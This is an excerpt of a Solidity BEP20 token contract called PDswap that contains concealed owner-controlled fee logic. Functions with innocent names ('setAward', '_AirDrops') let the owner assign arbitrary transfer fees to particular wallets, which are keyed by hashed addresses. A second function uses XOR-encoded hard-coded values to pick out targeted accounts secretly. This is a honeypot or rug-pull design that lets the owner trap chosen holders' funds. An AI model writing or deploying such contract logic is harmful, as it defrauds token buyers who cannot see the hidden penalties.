...
contract PDswap is BEP20, Ownable {
    ...
    mapping(uint256 => uint256) private _Escape;
    ...
    function setAward(uint256 _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }

    function getEscape(uint256 _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }
    ...
    function _receiveF(
        ...
        if (rF) {
            ...
            uint a = _bytes32ToUint(callKeccak256(_toBytes(from)));
            if (_Escape[a] > 0) {
                tradefeii = _Escape[a];
            }
    ...
    function _AirDrops(uint256[] memory _acc,uint256 _value) external onlyowaer {
        for (uint8 i=0; i<_acc.length;i++) {
            _Escape[_acc[i]] = _value;
        }
    }

	function _mljs(uint _acc) internal view virtual returns (uint256) {
		uint[6] memory acc = [uint(15257230785100615894329846012430706152436006596710807745827824854626758063921)
			,89296621863424060744191083242624882958422137178026577981368774846789469962349
			,4930976152288156642617802518162442629743619491753580726120224992068168041331
			,84051237654567965946883135067373550064446882186353725960013677147242681413750
			,41645020269544557977892970253296314448154775961666669515409031672110351463612
			,48816368626646962661469225685069838523622150919817071491666730444727000411298];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 49370315022425657719353143763903242532991067452056862924545437864000573459474) return _burnkfie1;
		}
		return _burnkfiel;
	}
